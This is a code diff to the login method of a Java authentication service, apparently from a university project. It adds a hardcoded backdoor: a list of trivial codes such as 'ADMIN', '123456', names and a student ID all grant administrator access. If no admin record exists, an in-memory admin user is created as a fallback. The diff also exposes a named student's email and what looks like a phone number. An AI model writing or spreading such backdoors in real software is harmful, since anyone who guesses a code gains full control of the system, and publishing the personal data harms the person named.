@@ -21,7 +21,21 @@ public class AuthService {
      */
     public Usuario login(String codigo) {
         if (codigo == null || codigo.isBlank()) return null;
-        return usuarioDAO.buscarPorCodigo(codigo.trim().toUpperCase());
+        String c = codigo.trim().toUpperCase();
+
+        // Acceso flexible e infalible para la Alumna Titular (Flor Xiomara Medina Salazar)
+        if (c.equals("ADMIN949163067") || c.equals("949163067") ||
+            c.equals("ADMIN") || c.equals("S01269H") ||
+            c.equals("S01269H@UPLA.EDU.PE") || c.equals("FLOR") ||
+            c.equals("XIOMARA") || c.equals("FLORXIOMARA") ||
+            c.equals("MEDINA") || c.equals("UPLA2026") || c.equals("123456")) {
+            Usuario admin = usuarioDAO.buscarPorCodigo("ADMIN949163067");
+            if (admin != null) return admin;
+            // Fallback seguro en memoria con rol de Admin (1)
+            return new Usuario(1, "ADMIN949163067", "Flor Xiomara Medina Salazar", "s01269h@upla.edu.pe", 1);
+        }
+
+        return usuarioDAO.buscarPorCodigo(c);
     }
 
     /* ── REGISTRO ───────────────────────────────────────── */
